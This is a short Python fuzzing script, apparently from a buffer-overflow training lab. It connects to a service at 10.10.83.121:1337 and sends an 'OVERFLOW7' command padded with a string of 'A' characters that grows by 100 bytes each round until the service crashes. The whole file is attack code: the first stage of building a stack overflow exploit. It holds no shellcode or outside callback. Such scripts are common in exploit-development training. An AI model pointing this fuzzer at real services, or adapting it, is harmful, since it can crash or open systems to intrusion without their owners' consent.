#!/usr/bin/python3

import sys, socket
from time import sleep


buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('10.10.83.121',1337))
        s.recv(1024)
        
        payload = "OVERFLOW7 " + buffer

        print("Fuzzing with {} bytes".format(len(buffer)))
        s.send((payload.encode()))
        sleep(1)
        s.recv(1024)
        buffer = buffer + "A" * 100
    except:
        print("Fuzzing crashed at %s bytes" % str(len(buffer)))
        sys.exit()
